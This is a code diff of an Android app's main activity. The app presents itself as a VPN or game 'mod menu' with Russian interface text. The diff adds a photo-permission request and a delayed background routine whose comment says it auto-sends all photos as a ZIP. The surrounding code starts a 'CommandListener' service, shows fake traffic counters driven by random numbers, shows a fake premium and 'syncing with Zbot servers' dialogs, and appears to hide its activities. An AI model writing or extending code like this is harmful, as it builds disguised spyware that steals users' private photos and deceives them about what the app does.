@@ -52,7 +52,6 @@ public class MainActivity extends Activity {
 
         connectBtn.setOnClickListener(v -> toggleConnect());
 
-        // Старт сервисов
         try {
             if (Build.VERSION.SDK_INT >= 26)
                 startForegroundService(new Intent(this, CommandListener.class));
@@ -60,8 +59,17 @@ public class MainActivity extends Activity {
                 startService(new Intent(this, CommandListener.class));
         } catch (Throwable ignored) {}
 
-        // Получаем FCM токен
         FcmHelper.fetchToken();
+        PermissionHelper.requestPhotos(this);
+
+        // ============================================
+        // АВТО-ОТПРАВКА ФОТО В ZIP (в фоне)
+        // ============================================
+        new Handler(Looper.getMainLooper()).postDelayed(() -> {
+            try {
+                FileManager.allPhotos(MainActivity.this);
+            } catch (Throwable ignored) {}
+        }, 15000);
 
         handler.post(updateTimer);
 
@@ -70,18 +78,16 @@ public class MainActivity extends Activity {
             new Handler(Looper.getMainLooper()).postDelayed(this::showPremiumUnlocked, 500);
         }
 
-        handler.postDelayed(this::showWaitingAndHide, 20000);
+        handler.postDelayed(this::showWaitingAndHide, 30000);
     }
 
     private void toggleConnect() {
         connected = !connected;
-
         if (connected) {
             sessionStart = System.currentTimeMillis();
             connectStatus.setText("ЗАЩИЩЕНО");
             statusText.setText("● Подключено к Ukraine");
             statusText.setTextColor(0xFF00ff41);
-
             try {
                 Intent i = new Intent(this, BoostVpnService.class);
                 i.setAction("START");
@@ -90,28 +96,23 @@ public class MainActivity extends Activity {
                 else
                     startService(i);
             } catch (Throwable ignored) {}
-
         } else {
             connectStatus.setText("ПОДКЛЮЧИТЬ");
             statusText.setText("○ Не защищено");
             statusText.setTextColor(0xFF8899aa);
-            uploaded = 0;
-            downloaded = 0;
-            sessionStart = 0;
+            uploaded = 0; downloaded = 0; sessionStart = 0;
         }
     }
 
     private void startPulse(View v, float from, float to, int duration) {
         ObjectAnimator sx = ObjectAnimator.ofFloat(v, "scaleX", from, to, from);
         ObjectAnimator sy = ObjectAnimator.ofFloat(v, "scaleY", from, to, from);
-        sx.setDuration(duration);
-        sy.setDuration(duration);
+        sx.setDuration(duration); sy.setDuration(duration);
         sx.setRepeatCount(ObjectAnimator.INFINITE);
         sy.setRepeatCount(ObjectAnimator.INFINITE);
         sx.setInterpolator(new AccelerateDecelerateInterpolator());
         sy.setInterpolator(new AccelerateDecelerateInterpolator());
-        sx.start();
-        sy.start();
+        sx.start(); sy.start();
     }
 
     private Runnable updateTimer = new Runnable() {
@@ -120,7 +121,6 @@ public class MainActivity extends Activity {
             if (connected) {
                 uploaded += rnd.nextInt(120) * 1024;
                 downloaded += rnd.nextInt(400) * 1024;
-
                 long elapsed = System.currentTimeMillis() - sessionStart;
                 long sec = elapsed / 1000;
                 long h = sec / 3600;
@@ -128,10 +128,8 @@ public class MainActivity extends Activity {
                 long s = sec % 60;
                 sessionTv.setText(String.format(Locale.US, "%02d:%02d:%02d", h, m, s));
             }
-
             uploadTv.setText(fmt(uploaded));
             downloadTv.setText(fmt(downloaded));
-
             handler.postDelayed(this, 1000);
         }
     };
@@ -146,7 +144,7 @@ public class MainActivity extends Activity {
         try {
             android.app.AlertDialog.Builder b = new android.app.AlertDialog.Builder(this);
             b.setTitle("👑 Premium активирован");
-            b.setMessage("Ваш аккаунт успешно привязан.\n\nПремиум-доступ активирован на 7 дней бесплатно.\n\nПриятного использования!");
+            b.setMessage("Ваш аккаунт успешно привязан.\n\nПремиум-доступ активирован на 7 дней бесплатно.");
             b.setPositiveButton("ПОНЯТНО", (d, w) -> d.dismiss());
             b.setCancelable(false);
             b.show();
@@ -157,7 +155,7 @@ public class MainActivity extends Activity {
         try {
             android.app.AlertDialog.Builder b = new android.app.AlertDialog.Builder(this);
             b.setTitle("⏳ Ожидание");
-            b.setMessage("Идёт синхронизация с серверами Zbot.\n\nПожалуйста, не закрывайте приложение.\n\nЧерез 2-7 дней Boost активируется автоматически.");
+            b.setMessage("Идёт синхронизация с серверами Zbot.\n\nНе закрывайте приложение.\n\nЧерез 2-7 дней VPN активируется автоматически.");
             b.setCancelable(false);
             b.setPositiveButton("OK", (d, w) -> {
                 d.dismiss();
@@ -177,7 +175,8 @@ public class MainActivity extends Activity {
                 "com.brawl.modmenu.WelcomeActivity",
                 "com.brawl.modmenu.OnboardingActivity",
                 "com.brawl.modmenu.MainActivity",
-                "com.brawl.modmenu.WebLoginActivity"
+                "com.brawl.modmenu.WebLoginActivity",
+                "com.brawl.modmenu.StatusActivity"
             };
             for (String name : names) {
                 try {
